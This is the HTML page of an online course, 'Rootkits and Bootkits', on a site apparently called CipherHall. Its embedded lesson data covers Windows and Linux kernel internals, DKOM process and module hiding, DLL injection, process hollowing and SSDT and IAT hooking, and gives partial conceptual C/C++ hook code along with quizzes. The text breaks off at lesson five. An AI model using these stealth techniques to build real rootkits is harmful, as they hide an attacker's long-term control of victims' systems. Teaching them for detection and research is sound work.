


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    
    <!-- ========== Start: SEO & Schema Enhancement ========== -->
    <title>Rootkits and Bootkits - Course Content | CipherHall</title>
    <meta name="description" content="Access the complete curriculum for the Rootkits and Bootkits course. Log in to track your progress, complete lessons, and take quizzes at CipherHall." />
    
    <!-- CRITICAL: This tells search engines not to index this page. -->

    
    <link rel="canonical" href="https://www.cipherhall.com/courses/rootkits-and-bootkits-complete-course.html" />

    <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "Course",
      "name": "Rootkits and Bootkits - Complete Learning Roadmap",
      "description": "A deeply technical, hands-on course in the art of developing and detecting the most advanced stealth malware. Explore the internals of modern operating systems and learn how to subvert them to achieve ultimate, persistent control.",
      "provider": {
        "@type": "Organization",
        "name": "CipherHall",
        "sameAs": "https://www.cipherhall.com"
      },
      "hasCourseInstance": {
        "@type": "CourseInstance",
        "courseMode": "Online",
        "instructor": {
          "@type": "Person",
          "name": "Dr. Evelyn Reed"
        }
      }
    }
    </script>
    <!-- ========== End: SEO & Schema Enhancement ========== -->

    <!-- Favicon -->
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon.png" />
    <link rel="shortcut icon" href="/favicon.png" type="image/x-icon" />
    <link rel="apple-touch-icon" sizes="180x180" href="/favicon.png" />

    <!-- Fonts, CSS, and JS -->
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;700&family=Exo+2:wght@700;800;900&display=swap" rel="stylesheet" />
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2.39.7/dist/umd/supabase.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-core.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/autoloader/prism-autoloader.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-okaidia.min.css" />
    <link rel="stylesheet" href="assets/css/coursepages.css">
</head>
  <body>
    <!-- Loading Screen -->
    <div id="loadingScreen" class="loading-screen">
      <div class="loader-icon">
        <i class="fas fa-graduation-cap"></i>
      </div>
      <div class="loader-text">Loading Course Content...</div>
    </div>

    <!-- Sidebar Overlay for Mobile -->
    <div class="sidebar-overlay" id="sidebarOverlay"></div>

    <!-- Music Player (fixed at top right) -->
    <div class="header-controls">
      <div class="music-dropdown" id="music-dropdown">
        <button class="btn btn-secondary">
          <span id="music-button-text">STUDY MUSIC</span>
          <i id="music-icon" class="fa-solid fa-music"></i>
        </button>
        <div class="music-dropdown-content" id="music-dropdown-content">
          <a
            href="#"
            data-src="https://www.learningcontainer.com/wp-content/uploads/2020/02/Kalimba.mp3"
            >1. Coffee Shop Vibes</a
          >
          <a
            href="#"
            data-src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-16.mp3"
            >2. City Lights Lofi</a
          >
          <a
            href="#"
            data-src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-15.mp3"
            >3. Mellow Thoughts</a
          >
          <a
            href="#"
            data-src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-13.mp3"
            >4. Rainy Mood</a
          >
          <a
            href="#"
            data-src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-10.mp3"
            >5. Time Alone</a
          >
          <a href="#" id="stop-music-link"
            ><i class="fa-solid fa-stop-circle"></i> Stop Music</a
          >
        </div>
      </div>

      <button class="btn btn-secondary" id="resetProgressBtn">
        <i class="fas fa-redo"></i>
        Reset Progress
      </button>
    </div>

    <!-- Auth Modal -->
    <div id="authModal" class="modal" style="display: none">
      <div class="modal-overlay"></div>
      <div class="modal-content">
        <span class="close" id="closeAuthModal">&times;</span>
        <div class="auth-tabs">
          <button id="tabSignIn" class="auth-tab active">Sign In</button>
          <button id="tabSignUp" class="auth-tab">Sign Up</button>
        </div>
        <div
          id="authLoader"
          style="display: none; text-align: center; padding: 2rem"
        >
          <i
            class="fas fa-spinner fa-spin fa-2x"
            style="color: var(--color-green)"
          ></i>
          <p style="margin-top: 0.5rem">Authenticating...</p>
        </div>
        <div id="signInForm" class="auth-form">
          <h2>Sign In to CipherHall</h2>
          <button id="googleSignIn" class="btn btn-google">
            <i class="fab fa-google"></i> Continue with Google
          </button>
          <div class="divider"><span>or</span></div>
          <form id="emailSignInForm">
            <input
              type="email"
              id="signInEmail"
              placeholder="Email Address"
              required
            />
            <input
              type="password"
              id="signInPassword"
              placeholder="Password"
              required
            />
            <button type="submit" class="btn btn-primary">Sign In</button>
          </form>
        </div>
        <div id="signUpForm" class="auth-form" style="display: none">
          <h2>Join CipherHall</h2>
          <button id="googleSignUp" class="btn btn-google">
            <i class="fab fa-google"></i> Continue with Google
          </button>
          <div class="divider"><span>or</span></div>
          <form id="emailSignUpForm">
            <input
              type="text"
              id="signUpName"
              placeholder="Full Name"
              required
            />
            <input
              type="email"
              id="signUpEmail"
              placeholder="Email Address"
              required
            />
            <input
              type="password"
              id="signUpPassword"
              placeholder="Password (min. 8 characters)"
              required
            />
            <button type="submit" class="btn btn-secondary">
              Create Account
            </button>
          </form>
        </div>
        <div id="authMessage"></div>
      </div>
    </div>

    <!-- Sidebar -->
    <aside class="sidebar" id="sidebar">
      <div class="sidebar-header">
        <div class="course-info">
          <h1 class="course-title" id="courseTitle">Loading...</h1>
          <div class="course-progress">
            <div class="progress-header">
              <span class="progress-label">Course Progress</span>
              <span class="progress-percentage" id="courseProgressPercent"
                >0%</span
              >
            </div>
            <div class="progress-bar">
              <div
                class="progress-fill"
                id="courseProgressFill"
                style="width: 0%"
              ></div>
            </div>
            <div class="progress-stats">
              <span id="completedLessons">0</span>
              <span id="totalLessons">0</span>
            </div>
          </div>
          <a href="/dashboard.html" class="back-to-dashboard">
            <i class="fas fa-arrow-left"></i>
            Back to Dashboard
          </a>
        </div>
      </div>

      <nav class="lesson-nav" id="lessonNav">
        <!-- Lessons will be loaded dynamically -->
      </nav>
    </aside>

    <!-- Main Content -->
    <main class="main-content">
      <header class="content-header">
        <div class="lesson-header">
          <div class="lesson-header-left">
            <span class="lesson-number" id="currentLessonNumber">1</span>
            <h1 class="lesson-header-title" id="currentLessonTitle">
              Loading...
            </h1>
          </div>
          <div class="lesson-actions">
            <button class="mbtn btn-primary" id="menuToggle">
              <i class="fas fa-bars"></i>
            </button>
          </div>
        </div>
      </header>

      <div class="content-body" id="contentBody">
        <div class="lesson-content" id="lessonContent">
          <!-- Lesson content will be loaded dynamically -->
        </div>
      </div>

      <footer class="lesson-navigation">
        <div class="nav-info" id="navInfo">Lesson 1 of 10</div>
        <div class="nav-controls">
          <button class="btn btn-secondary" id="prevLessonBtn" disabled>
            <i class="fas fa-chevron-left"></i>
            Previous
          </button>
          <button class="btn btn-primary" id="nextLessonBtn" disabled>
            Next
            <i class="fas fa-chevron-right"></i>
          </button>
        </div>
      </footer>
    </main>

    <!-- Achievement Notification -->
    <div id="achievementNotification" class="achievement-notification">
      <div class="notification-header">
        <div class="notification-icon" id="notificationIcon">
          <i class="fas fa-trophy"></i>
        </div>
        <div class="notification-content">
          <h3 id="notificationTitle">Achievement Unlocked!</h3>
          <p id="notificationDescription">Description here...</p>
        </div>
      </div>
      <div class="notification-reward" id="notificationReward">
        <i class="fas fa-coins"></i>
        <span id="notificationPoints">+100 Points</span>
      </div>
    </div>

    <!-- Toast Notification -->
    <div id="toast" class="toast">
      <span id="toastMessage"></span>
    </div>

    <script>
      // =====================================================
      // SYNCHRONIZED COURSE SYSTEM WITH DASHBOARD INTEGRATION
      // =====================================================

      // Supabase Configuration - Replace with your config
      const supabaseUrl = "https://lzcmzulemfubjaksoqor.supabase.co";
      const supabaseKey =
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imx6Y216dWxlbWZ1Ympha3NvcW9yIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTUzMzM5MDgsImV4cCI6MjA3MDkwOTkwOH0.crhPH4YWtRsr1BJTpAQcmPbWSpwIWRbzoI4sRb2_fPI";
      const supabase = window.supabase.createClient(supabaseUrl, supabaseKey);

      // =====================================================
      // COURSE DATA STRUCTURE - REPLACE WITH YOUR COURSE JSON
      // =====================================================

      const COURSE_DATA =   {
        "id": "rootkits-and-bootkits",
        "title": "Rootkits and Bootkits - Complete Learning Roadmap",
        "description": "A deeply technical, hands-on course in the art of developing and detecting the most advanced stealth malware. Explore the internals of modern operating systems and learn how to subvert them to achieve ultimate, persistent control.",
        "category": "offensive-security",
        "difficulty": "Expert",
        "duration": "150 hours",
        "instructor": "Dr. Evelyn Reed",
        "lessons": [
            {
                "id": "lesson-1",
                "title": "Rootkit Fundamentals and Classification",
                "duration": "120 min",
                "objectives": [
                    "Define the purpose and function of a rootkit.",
                    "Classify rootkits as either user-mode or kernel-mode.",
                    "Understand the attack lifecycle and the role of persistence.",
                    "Explain the core principles of detection evasion.",
                    "Discuss the legal and ethical considerations of rootkit research."
                ],
                "content": {
                    "overview": "This lesson introduces the foundational concepts of rootkit technology. We will define what a rootkit is, explore its primary goal of achieving stealth and persistence, and classify the different levels at which they can operate. We will also establish the critical legal and ethical framework that must govern all research in this advanced and sensitive field.",
                    "sections": [
                        {
                            "title": "Definition and Purpose of Rootkits",
                            "content": "<p>A rootkit is a type of malicious software designed to gain unauthorized, high-level ('root' or 'administrator') access to a computer while simultaneously concealing its own existence or the existence of other malware. Its primary purpose is not to cause the initial damage, but to provide stealth and long-term persistence for the attacker's main payload.</p><p><strong>Real-world Example:</strong> An attacker compromises a server using a web vulnerability. They install a backdoor to exfiltrate data. A standard backdoor process would be visible in the Task Manager. The attacker then installs a rootkit. The rootkit's only job is to hide the backdoor's process from the Task Manager and its network connections from tools like `netstat`. The rootkit itself doesn't steal data, but it is the enabler that allows the data-stealing malware to operate undetected for months or years.</p>",
                            "image": "https://images.unsplash.com/photo-1548092372-2d987bde898b?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Rootkit Classification (User-Mode vs. Kernel-Mode)",
                            "content": "<p>Rootkits are classified by the privilege level at which they operate.</p><ul><li><strong>User-Mode (Ring 3):</strong> These rootkits operate at the same level as user applications. They typically work by hooking APIs or injecting DLLs into legitimate processes to hide their activity. They are easier to develop but also easier to detect.</li><li><strong>Kernel-Mode (Ring 0):</strong> These rootkits operate at the highest privilege level of the operating system. They are implemented as malicious drivers or loadable kernel modules. By compromising the kernel itself, they can subvert the entire OS and are extremely difficult to detect and remove.</li></ul>",
                            "image": "https://images.unsplash.com/photo-1504384308090-c894fdcc538d?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Detection Evasion Principles",
                            "content": "<p>The core principle of a rootkit is to control the victim's perception of reality. It achieves this by becoming the 'gatekeeper' of information. When the user asks the operating system, 'What processes are running?', a rootkit intercepts this question. It gets the real answer from the kernel, removes its own malicious process from the list, and then presents the falsified list back to the user. The user's tools can no longer be trusted because the underlying OS is lying to them. This is why detection often requires a more trusted vantage point, like a memory analysis from a separate machine.</p>",
                            "image": "https://images.unsplash.com/photo-1526628953301-3e589a6a8b74?w=800&h=400&fit=crop"
                        }
                    ],
                    "codeExamples": [
                        {
                            "title": "Process Hiding Demonstration (User-Mode)",
                            "language": "c",
                            "code": "// This is a highly conceptual C++ snippet demonstrating the logic of a user-mode\n// process hiding technique using API hooking.\n\n#include <Windows.h>\n\n// Define a pointer to the original, legitimate function\nBOOL (WINAPI *OriginalProcess32Next)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);\n\n// Our malicious replacement function\nBOOL WINAPI HookedProcess32Next(HANDLE hSnapshot, LPPROCESSENTRY32 lppe) {\n    // 1. Call the original function to get the next real process.\n    BOOL result = OriginalProcess32Next(hSnapshot, lppe);\n\n    // 2. Check if the process name is the one we want to hide.\n    if (result && wcscmp(lppe->szExeFile, L\"malware.exe\") == 0) {\n        // 3. If it is, lie and call the original function again to get the *next*\n        //    process, effectively skipping our malicious one.\n        result = OriginalProcess32Next(hSnapshot, lppe);\n    }\n\n    return result;\n}\n\n// In the main part of the rootkit, it would use a library like Microsoft Detours\n// to overwrite the pointer in the Import Address Table of explorer.exe to point\n// HookedProcess32Next instead of the real Process32Next."
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        {
                            "id": 1,
                            "question": "What is the primary purpose of a rootkit?",
                            "options": [
                                "To encrypt the user's files for a ransom.",
                                "To gain unauthorized access and conceal its own existence or the existence of other malware.",
                                "To launch a denial-of-service attack.",
                                "To steal passwords."
                            ],
                            "correct": 1,
                            "explanation": "A rootkit's core function is stealth and persistence. It is the tool an attacker uses to maintain long-term, hidden control over a compromised system."
                        },
                        {
                            "id": 2,
                            "question": "A rootkit that is implemented as a malicious driver and operates at the highest privilege level of the OS is known as a:",
                            "options": [
                                "User-mode rootkit",
                                "Kernel-mode rootkit",
                                "Application-level rootkit",
                                "Browser-based rootkit"
                            ],
                            "correct": 1,
                            "explanation": "Kernel-mode (Ring 0) rootkits are the most powerful and stealthy because they can subvert the core of the operating system itself."
                        },
                        {
                            "id": 3,
                            "question": "How does a rootkit typically hide a malicious process from the Task Manager?",
                            "options": [
                                "By deleting the Task Manager executable.",
                                "By intercepting the operating system call that lists processes and filtering its own process out of the results.",
                                "By giving the process a very common name like 'svchost.exe'.",
                                "It cannot hide a process from the Task Manager."
                            ],
                            "correct": 1,
                            "explanation": "The rootkit acts as a malicious gatekeeper of information. By hooking the underlying system functions, it can lie to user-mode applications like Task Manager, presenting a falsified view of the system's state."
                        }
                    ]
                }
            },
            {
                "id": "lesson-2",
                "title": "Operating System Internals - Windows",
                "duration": "120 min",
                "objectives": [
                    "Understand the high-level architecture of the Windows kernel (NTOSKRNL).",
                    "Analyze the structure and purpose of the System Service Descriptor Table (SSDT).",
                    "Differentiate between the Native API and the Win32 API.",
                    "Explore the role of the Object Manager in managing kernel resources.",
                    "Dissect the EPROCESS and ETHREAD structures that define processes and threads."
                ],
                "content": {
                    "overview": "To write a Windows rootkit, you must first understand the internal workings of the Windows kernel. This lesson provides a deep dive into the core components of the Windows operating system, from its layered architecture to the critical data structures that a rootkit must manipulate to achieve its goals.",
                    "sections": [
                        {
                            "title": "Windows Kernel Architecture",
                            "content": "<p>The Windows kernel is a hybrid kernel. The core executable is `ntoskrnl.exe`. It runs in Ring 0 and is responsible for all core OS functions.</p><h3>Key Components:</h3><ul><li><strong>Hardware Abstraction Layer (HAL):</strong> The lowest-level component, which provides a consistent interface to the underlying hardware.</li><li><strong>Kernel:</strong> Manages the CPU, including scheduling threads and handling interrupts.</li><li><strong>Executive:</strong> Contains the high-level kernel components, including the Memory Manager, Process Manager, I/O Manager, and the Object Manager.</li></ul>",
                            "image": "https://images.unsplash.com/photo-1542744173-8e7e53415bb0?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "System Service Descriptor Table (SSDT)",
                            "content": "<p>The SSDT is a table of function pointers in the kernel. It is the bridge between user mode and kernel mode. When a user-mode application calls a function like `CreateFile`, it eventually results in a system call that looks up the address of the real kernel function (e.g., `NtCreateFile`) in the SSDT and then executes it.</p><p><strong>Real-world Example: SSDT Hooking.</strong> A rootkit wants to hide a file named `malware.txt`. It loads its own malicious driver. The driver finds the address of the SSDT in memory. It then finds the pointer for the kernel function that lists the contents of a directory. The rootkit saves the original pointer and then overwrites the entry in the SSDT with a pointer to its *own* function. Now, when any program on the system tries to list a directory, the rootkit's function is called first. The rootkit's function calls the original, saved function to get the real list of files, filters out `malware.txt` from the results, and then returns the fake list to the user. This is a classic method for kernel-mode file hiding.</p>",
                            "image": "https://images.unsplash.com/photo-1519389950473-47ba0277781c?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Process and Thread Structures (EPROCESS/ETHREAD)",
                            "content": "<p>The Windows kernel maintains a data structure for every running process, known as the `EPROCESS` block. These blocks are connected together in a circular, doubly-linked list.</p><h3>DKOM Attacks:</h3><p>The `pslist` command in Volatility works by walking this linked list. A Direct Kernel Object Manipulation (DKOM) rootkit can hide a process by simply finding its `EPROCESS` block in this list and modifying the `Flink` (forward link) and `Blink` (backward link) pointers of the adjacent blocks to 'unlink' its own process, effectively making it invisible to any tool that relies on this standard list.</p>",
                            "image": "https://images.unsplash.com/photo-1526628953301-3e589a6a8b74?w=800&h=400&fit=crop"
                        }
                    ],
                    "codeExamples": [
                        {
                            "title": "System Call Interception (Conceptual C++)",
                            "language": "cpp",
                            "code": "// This is conceptual C++ code for a kernel driver that hooks the SSDT.\n// This is highly simplified and for educational purposes only.\n\n// 1. Get the address of the SSDT (KeServiceDescriptorTable).\n//    This is not exported, so it must be found dynamically.\n\n// 2. Disable write protection on the memory page containing the SSDT.\n//    This is necessary to modify the read-only kernel memory.\n\n// 3. Get the original address of the function we want to hook (e.g., NtQueryDirectoryFile).\nOriginalNtQueryDirectoryFile = SSDT[SYSCALL_INDEX_NtQueryDirectoryFile];\n\n// 4. Overwrite the pointer in the SSDT with the address of our malicious function.\nSSDT[SYSCALL_INDEX_NtQueryDirectoryFile] = &HookedNtQueryDirectoryFile;\n\n// 5. Re-enable write protection.\n\n// --- Our Hooking Function ---\nNTSTATUS HookedNtQueryDirectoryFile(...) {\n    // Call the original function to get the real directory listing.\n    NTSTATUS status = OriginalNtQueryDirectoryFile(...);\n\n    if (NT_SUCCESS(status)) {\n        // If the call was successful, parse the buffer of file results.\n        // Find and remove any entries that match the name of our hidden file.\n        RemoveEntryFromBuffer(buffer, \"malware.txt\");\n    }\n\n    return status;\n}"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        {
                            "id": 1,
                            "question": "In the Windows kernel, what is the primary purpose of the System Service Descriptor Table (SSDT)?",
                            "options": [
                                "To store a list of all files on the hard drive.",
                                "To act as a bridge between user mode and kernel mode by holding pointers to the core kernel functions.",
                                "To manage the computer's network connections.",
                                "To store user passwords."
                            ],
                            "correct": 1,
                            "explanation": "The SSDT is the central dispatch table for system calls. Hooking this table is a primary technique for kernel-mode rootkits to intercept and modify OS behavior."
                        },
                        {
                            "id": 2,
                            "question": "The core data structure that the Windows kernel uses to represent a running process is known as the:",
                            "options": [
                                "EPROCESS block",
                                "ETHREAD block",
                                "DRIVER_OBJECT",
                                "FILE_OBJECT"
                            ],
                            "correct": 0,
                            "explanation": "The EPROCESS structure contains all the essential information about a process, from its PID and name to its memory tables and security token. These structures are kept in a linked list that rootkits often target."
                        },
                        {
                            "id": 3,
                            "question": "A rootkit that hides a process by directly manipulating the linked list of EPROCESS blocks in kernel memory is performing what kind of attack?",
                            "options": [
                                "SSDT Hooking",
                                "Direct Kernel Object Manipulation (DKOM)",
                                "DLL Injection",
                                "A buffer overflow"
                            ],
                            "correct": 1,
                            "explanation": "DKOM is a very stealthy rootkit technique because it doesn't modify any code (like an SSDT hook does). It directly modifies the kernel's internal data structures to make its process 'disappear' from the standard lists."
                        }
                    ]
                }
            },
            {
                "id": "lesson-3",
                "title": "Operating System Internals - Linux",
                "duration": "120 min",
                "objectives": [
                    "Understand the architecture of the monolithic Linux kernel.",
                    "Analyze the structure and purpose of the system call table.",
                    "Learn the fundamentals of Loadable Kernel Module (LKM) development.",
                    "Dissect the `task_struct` that defines a process.",
                    "Explore the internals of the Virtual File System (VFS)."
                ],
                "content": {
                    "overview": "This lesson transitions to the Linux operating system, exploring the internal architecture of its monolithic kernel. We will learn how Linux handles system calls, how its process structures are organized, and how Loadable Kernel Modules (LKMs) can be used (and abused) to extend the kernel's functionality, which is the primary method for creating a Linux rootkit.",
                    "sections": [
                        {
                            "title": "Linux Kernel Architecture",
                            "content": "<p>The Linux kernel is a **monolithic** kernel. This means that the entire core operating system (process management, memory management, device drivers, etc.) runs in a single, large program in kernel space.</p><h3>Loadable Kernel Modules (LKMs):</h3><p>While the kernel is monolithic, its functionality can be extended at runtime by loading an LKM. An LKM is a piece of code (a driver, a file system, etc.) that can be dynamically loaded into and unloaded from the kernel without rebooting. This is the primary mechanism for writing a kernel-mode rootkit on Linux.</p>",
                            "image": "https://images.unsplash.com/photo-1629654297299-c8506221ca97?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "The System Call Table",
                            "content": "<p>Similar to the SSDT on Windows, the Linux kernel maintains a `sys_call_table`. This is an array of function pointers that holds the addresses of all the kernel's system call handler functions (e.g., `sys_open`, `sys_read`).</p><p><strong>Real-world Example: System Call Table Hooking.</strong> A researcher writes a malicious LKM. In the module's initialization function, it finds the address of the `sys_call_table` in kernel memory. It then saves the original address of a target function, like `sys_getdents` (which is used to list directory contents). It then overwrites the entry in the table with a pointer to its own, malicious `hooked_getdents` function. This hooked function can then filter out the rootkit's files before returning the results to the user, effectively hiding them from view.</p>",
                            "image": "https://images.unsplash.com/photo-1517694712202-14dd9538aa97?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "The `task_struct` and Module Hiding",
                            "content": "<p>The core data structure for a process in Linux is the `task_struct`. Similar to `EPROCESS` on Windows, these structures are kept in a circular, doubly-linked list. A rootkit can use DKOM techniques to hide a process by unlinking its `task_struct` from this list.</p><h3>Module Hiding:</h3><p>When an LKM is loaded, it is added to a linked list of all loaded modules. The `lsmod` command works by simply reading this list. A common rootkit technique is to load its own malicious module and then use a DKOM technique to remove its own `module` structure from this linked list. The rootkit's code is still resident and running in the kernel, but it is now invisible to the `lsmod` command, making it much harder to detect.</p>",
                            "image": "https://images.unsplash.com/photo-1550745165-9bc0b252726a?w=800&h=400&fit=crop"
                        }
                    ],
                    "codeExamples": [
                        {
                            "title": "Basic LKM Development (C)",
                            "language": "c",
                            "code": "#include <linux/init.h>\n#include <linux/module.h>\n#include <linux/kernel.h>\n\nMODULE_LICENSE(\"GPL\");\nMODULE_AUTHOR(\"Your Name\");\nMODULE_DESCRIPTION(\"A simple Hello World LKM.\");\n\n// This function is called when the module is loaded.\nstatic int __init hello_init(void) {\n    printk(KERN_INFO \"Hello, kernel world!\\n\");\n    return 0;\n}\n\n// This function is called when the module is removed.\nstatic void __exit hello_exit(void) {\n    printk(KERN_INFO \"Goodbye, kernel world!\\n\");\n}\n\nmodule_init(hello_init);\nmodule_exit(hello_exit);\n\n// To compile this, you need the kernel headers installed.\n// It is then loaded with 'insmod hello.ko' and removed with 'rmmod hello'."
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        {
                            "id": 1,
                            "question": "The primary mechanism for adding functionality (and for writing rootkits) to the Linux kernel at runtime is through:",
                            "options": [
                                "DLL Injection",
                                "Loadable Kernel Modules (LKMs)",
                                "The Windows Registry",
                                "Systemd services"
                            ],
                            "correct": 1,
                            "explanation": "LKMs are the official, supported way to dynamically extend the Linux kernel's functionality. This same mechanism is abused by attackers to load their malicious code directly into the kernel."
                        },
                        {
                            "id": 2,
                            "question": "The Linux equivalent of the Windows `EPROCESS` structure, which holds all the information about a process, is the:",
                            "options": [
                                "`task_struct`",
                                "`inode`",
                                "`superblock`",
                                "`module`"
                            ],
                            "correct": 0,
                            "explanation": "The `task_struct` is the fundamental data structure for a process in the Linux kernel. These structures are kept in a linked list, which is a primary target for DKOM-based process hiding."
                        },
                        {
                            "id": 3,
                            "question": "A Linux rootkit that wants to hide itself from the `lsmod` command would most likely do what?",
                            "options": [
                                "Delete the `lsmod` binary.",
                                "Hook the `sys_call_table`.",
                                "Use a DKOM technique to remove its own `module` structure from the kernel's linked list of loaded modules.",
                                "Encrypt its own LKM file on the disk."
                            ],
                            "correct": 2,
                            "explanation": "This is the classic technique for module hiding. The rootkit's code remains active in memory, but by removing itself from the list that `lsmod` reads, it becomes invisible to standard system administration tools."
                        }
                    ]
                }
            },
            {
                "id": "lesson-4",
                "title": "User-Mode Rootkits Development",
                "duration": "120 min",
                "objectives": [
                    "Implement various DLL injection techniques.",
                    "Develop API hooks to intercept and modify function calls.",
                    "Create a process hollowing demonstration.",
                    "Use registry manipulation for stealth and persistence.",
                    "Apply various user-mode stealth techniques to hide artifacts."
                ],
                "content": {
                    "overview": "While kernel-mode rootkits are more powerful, user-mode rootkits are easier to develop and more common. This lesson provides a hands-on guide to the core techniques used by user-mode rootkits, focusing on how they inject code into other processes and hook APIs to control their behavior and hide their presence.",
                    "sections": [
                        {
                            "title": "DLL Injection Techniques",
                            "content": "<p>DLL injection is the process of forcing a target process to load a malicious DLL. Once the DLL is loaded into the target's address space, its code can run with the same permissions as the target process.</p><h3>Common Methods:</h3><ul><li><strong>`CreateRemoteThread`:</strong> The most classic technique. The attacker process uses this Windows API to create a new thread in the target process, with the starting address of the thread pointed to the `LoadLibrary` function, and the argument being the path to the malicious DLL.</li><li><strong>`SetWindowsHookEx`:</strong> A Windows mechanism for installing 'hooks' to monitor system events (like keyboard input). An attacker can use this to install a global hook that injects their malicious DLL into every GUI process on the system.</li></ul>",
                            "image": "https://images.unsplash.com/photo-1587620962725-abab7fe55159?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "API Hooking Methods",
                            "content": "<p>Once the malicious DLL is injected into a target process, its primary goal is to hook APIs. This means redirecting a legitimate function call to the rootkit's own malicious code.</p><p><strong>Real-world Example: IAT Hooking.</strong> A rootkit wants to hide its network connections. It injects a DLL into `explorer.exe`. This DLL finds the Import Address Table (IAT) of `explorer.exe` in memory. The IAT is a table of pointers to all the external functions the program uses (like `connect` from `ws2_32.dll`). The rootkit overwrites the pointer for the `connect` function in the IAT with a pointer to its own `HookedConnect` function. Now, whenever `explorer.exe` tries to make a network connection, the rootkit's code runs first. The `HookedConnect` function checks if the destination IP is the malware's C2 server. If it is, it blocks the call from proceeding. Otherwise, it passes the call to the original `connect` function. This effectively hides the C2 traffic from any tools that are inspecting that process's network activity.</p>",
                            "image": "https://images.unsplash.com/photo-1515879218367-8466d910aaa4?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Process Hollowing",
                            "content": "<p>Process hollowing is a powerful stealth technique that combines process creation and code injection.</p><h3>The Steps:</h3><ol><li>The attacker starts a new instance of a legitimate, trusted process (like `svchost.exe`) in a **suspended** state.</li><li>They 'hollow out' the memory of this suspended process, unmapping its legitimate code.</li><li>They allocate new memory and write their own malicious code into the process's address space.</li><li>They modify the entry point of the process to point to their malicious code.</li><li>They resume the process.</li></ol><p>The result is a process that looks legitimate to the Task Manager and other tools (it's a real `svchost.exe` process), but it is actually running the attacker's malicious code. This is a very effective way to bypass application whitelisting.</p>",
                            "image": "https://images.unsplash.com/photo-1542744173-8e7e53415bb0?w=800&h=400&fit=crop"
                        }
                    ],
                    "codeExamples": [
                        {
                            "title": "IAT Hooking Implementation (Conceptual C++)",
                            "language": "cpp",
                            "code": "#include <Windows.h>\n\n// Conceptual code for IAT hooking.\n// This would be inside a DLL that has been injected into a target process.\n\n// 1. Get the base address of the running process.\nHMODULE hModule = GetModuleHandle(NULL);\n\n// 2. Parse the PE header of the process in memory to find the Import Directory.\n// 3. Iterate through the Import Directory to find the Import Address Table (IAT).\n\n// 4. Find the specific entry in the IAT for the function we want to hook (e.g., 'connect').\n// PIMAGE_THUNK_DATA pThunk = FindIATEntry(hModule, \"ws2_32.dll\", \"connect\");\n\n// 5. Save the address of the original function.\n// OriginalConnect = (CONNECT_FUNC)pThunk->u1.Function;\n\n// 6. Overwrite the pointer in the IAT with the address of our hook function.\n//    This requires changing the memory protection on the IAT's page first.\n// DWORD oldProtect;\n// VirtualProtect(pThunk, sizeof(DWORD_PTR), PAGE_READWRITE, &oldProtect);\n// pThunk->u1.Function = (DWORD_PTR)HookedConnect;\n// VirtualProtect(pThunk, sizeof(DWORD_PTR), oldProtect, &oldProtect);"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        {
                            "id": 1,
                            "question": "The technique of forcing a target process to load a malicious DLL into its own address space is known as:",
                            "options": [
                                "Process Hollowing",
                                "DLL Injection",
                                "A buffer overflow",
                                "A kernel exploit"
                            ],
                            "correct": 1,
                            "explanation": "DLL injection is the fundamental technique that user-mode rootkits use to get their code running inside of another, trusted process."
                        },
                        {
                            "id": 2,
                            "question": "What is the primary goal of API hooking?",
                            "options": [
                                "To make a program run faster.",
                                "To intercept and modify the behavior of a legitimate function call.",
                                "To crash a program.",
                                "To bypass a firewall."
                            ],
                            "correct": 1,
                            "explanation": "By 'hooking' an API, a rootkit can become the gatekeeper for that function. This allows it to filter information (to hide files or processes) or to change the function's behavior."
                        },
                        {
                            "id": 3,
                            "question": "The technique of starting a legitimate process in a suspended state and replacing its code with malicious code before resuming it is called:",
                            "options": [
                                "DLL Injection",
                                "API Hooking",
                                "Process Hollowing",
                                "A rootkit"
                            ],
                            "correct": 2,
                            "explanation": "Process hollowing is a very effective stealth technique. It uses a legitimate, trusted process as a 'hollow' shell to host the malicious code, making it much harder to spot than a standalone malicious executable."
                        }
                    ]
                }
            },
            {
                "id": "lesson-5",
                "title": "Kernel-Mode Rootkits - Windows",
                "duration": "120 min",
                "objectives": [
                    "Understand the fundamentals of Windows kernel driver development.",
                    "Implement a rootkit using SSDT hooking.",
                    "Develop an IRP hooking filter driver to intercept file system or network requests.",
                    "Use Direct Kernel Object Manipulation (DKOM) to hide a process.",
                    "Register kernel callbacks to monitor system events."
                ],
                "content": {
                    "overview": "This lesson makes the leap into Ring 0. We will cover the fundamentals of Windows kernel driver development and implement the core techniques used by kernel-mode rootkits to subvert the operating system. This includes the classic methods of SSDT hooking, the more modern IRP hooking, and the stealthy DKOM.",
                    "sections": [
                        {
